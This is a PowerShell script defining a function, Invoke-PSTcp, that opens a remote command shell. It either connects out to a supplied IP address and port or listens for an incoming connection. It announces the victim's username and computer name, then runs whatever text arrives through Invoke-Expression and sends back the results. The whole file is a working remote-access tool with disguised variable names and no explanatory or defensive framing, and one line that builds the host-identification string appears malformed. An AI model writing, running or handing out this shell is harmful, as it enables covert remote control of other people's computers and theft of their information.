function Invoke-PSTcp 
{       
    [CmdletBinding(DefaultParameterSetName="rev")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="rev")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddr,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="rev")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Pt,

        [Parameter(ParameterSetName="rev")]
        [Switch]
        $Rev,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Binding

    )

    
    try 
    {
        
        if ($Rev)
        {
            $clients = New-Object System.Net.Sockets.TCPClient($IPAddr,$Pt)
        }

        
        if ($Binding)
        {
            $listen = [System.Net.Sockets.TcpListener]$Pt
            $listen.start()    
            $clients = $listen.AcceptTcpClient()
        } 

        $river = $clients.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        
        $sendbits = ([text.encoding]::ASCII).GetBytes("User " + $env:username + " Workstation: " + $env:computername`n`n")
        $river.Write($sendbits,0,$sendbits.Length)

        
        $sendbits = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $river.Write($sendbits,0,$sendbits.Length)

        while(($i = $river.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncdedTxt = New-Object -TypeName System.Text.ASCIIEncoding
            $datamine = $EncdedTxt.GetString($bytes,0, $i)
            try
            {
                
                $send = (Invoke-Expression -Command $datamine 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong" 
                Write-Error $_
            }
            $send2  = $send + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $send2 = $send2 + $x

            
            $sendbyte = ([text.encoding]::ASCII).GetBytes($send2)
            $river.Write($sendbyte,0,$sendbyte.Length)
            $river.Flush()  
        }
        $clients.Close()
        if ($listen)
        {
            $listen.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong!" 
        Write-Error $_
    }
}
